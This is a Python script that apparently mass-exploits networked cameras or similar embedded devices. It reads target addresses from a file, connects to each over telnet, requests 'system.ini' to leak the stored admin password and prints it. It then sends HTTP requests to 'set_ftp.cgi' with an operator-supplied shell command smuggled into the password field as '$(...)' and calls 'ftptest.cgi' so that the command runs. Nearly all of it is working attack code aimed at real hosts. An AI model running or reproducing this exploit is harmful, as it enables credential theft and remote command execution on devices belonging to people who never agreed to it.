from telnetlib import Telnet 
import socket
import requests
import sys
import time

try:
	f = open('out.txt')
	lines = f.readlines()
except:
	print("out.txt file is missing...")

try:
	cmd = input("cmd >")
except:
	print("error...")

for line in lines:
	data = line.split()
	try:
		try:
			try:
				with Telnet(str(data[0]), int(data[1]), 1.5) as tn:
					print("---------------------\\http://" + data[0] + ":" + data[1] + "\\----------------------------")
					tn.write(b"GET system.ini\n\n")
					response = tn.read_all()
					idx = response.find(b'admin')
					if idx != -1:
						print("username: admin")
						print("password: ", end='')
						response = response[idx + 5:]
						idx = response.find(b'\x01')
						response = response[:idx]
						if response.find(b'\x05') != -1:
							idx = response.find(b'\x05')
							response = response[:idx]
						if response.find(b'\x03') != -1:
							idx = response.find(b'\x03')
							response = response[:idx]
						if response.find(b'\n') != -1:
							idx = response.find(b'\n')
							response = response[:idx]
						if response.find(b'\x1f') != -1:
							idx = response.find(b'\x1f')
							response = response[:idx]
						response = str(response[:idx])
						print(response[2:len(response) -1]) #password

						ip_address = str(data[0])
						remote_port = str(data[1])
						username = 'admin'
						password = response[2:len(response) -1]

						url_1 = "http://{0}:{1}/set_ftp.cgi?next_url=ftp.htm&loginuse={2}&loginpas={3}&svr=127.0.0.1&port=21&user=ftp&pwd=$({4})&dir=/&mode=PORT&upload_interval=0".format(ip_address, remote_port, username, password, cmd)

						url_2 = "http://{0}:{1}/ftptest.cgi?next_url=test_ftp.htm&loginuse={2}&loginpas={3}".format(ip_address,remote_port,username,password)

						try:
   							print("Request 1/2")
   							response = requests.get(url_1)
   							print(response)
						except:
   							print("Request error 1/2")

						time.sleep(2)

						try:
							print("Request 2/2")
							response = requests.get(url_2)
							print(response)
						except:
							print("Request error 2/2")

						print("Payload transmission completed.\n")

					else:
						print("Not vulnerable")
					tn.close()
			except socket.timeout:
				print("timeout...\n")
		except EOFError:
			print("EOFError...\n")
	except:
		print("Error...")
